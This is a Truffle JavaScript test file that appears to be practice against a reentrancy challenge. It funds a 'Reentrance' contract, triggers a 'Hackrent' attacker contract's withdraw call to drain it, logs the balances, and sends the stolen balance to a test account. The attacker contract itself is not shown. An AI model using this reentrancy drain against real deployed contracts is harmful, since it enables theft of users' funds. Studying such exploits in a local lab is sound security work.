const Reentrance = artifacts.require("Reentrance");
const Hackrent = artifacts.require("Hackrent");

contract("Reentrance", (accounts) => {
    let reentrInsta;
    let hackrent;
    let adRen;
    let adHack;

    beforeEach( async () => {
        reentrInsta = await Reentrance.deployed();
        hackrent = await Hackrent.deployed();
        adRen = await reentrInsta.address;
        adHack = await hackrent.address;
    })

    xit('testin donate call', async () => {

        await reentrInsta.donate(adHack, {value: 10});
        Balance = await reentrInsta.balanceOf.call((adHack));
        console.log(Balance);



        /*await hackrent.callDonate(accounts[2], {value: 10});
        Balance = await reentrInsta.balanceOf(accounts[2]);
        console.log(Balance);
        */
    })

    xit('testing deposit in hackrent', async () => {
        await hackrent.deposit({from: accounts[0], value: 10});
        Balance = await web3.eth.getBalance(adHack);
        console.log(Balance);
    })

    xit('testing init deposit', async () => {
        await reentrInsta.donate(accounts[5], {value: 1000});
        Balance = await reentrInsta.balanceOf(accounts[5]);
        console.log(Balance);
    }) 

    
    it('testing withdraw function', async () => {
        await reentrInsta.donate(accounts[5], {value: 1000});
        await reentrInsta.donate(adHack, {value: 100});
        Balance = await web3.eth.getBalance(adRen);
        hackBal = await web3.eth.getBalance(adHack);
        console.log('Reent balance before is:', Balance);
        console.log('Hack Balance before is:', hackBal);
        //await hackrent.deposit({from: accounts[0], value: 1});
        await hackrent.callWithdraw({ value: 100});
        Balanceafter = await web3.eth.getBalance(adRen);
        hackBalafter = await web3.eth.getBalance(adHack);
        console.log('Reent balance after is:', Balanceafter);
        console.log('Hack balance after is:', hackBalafter);


        console.log('account bal before is:', await web3.eth.getBalance(accounts[4]))
        await hackrent.withdrawBal({from: accounts[4]});
        console.log('account bal after is:',await web3.eth.getBalance(accounts[4]))
        bal = await web3.eth.getBalance(adHack);
        console.log(bal);
    })
})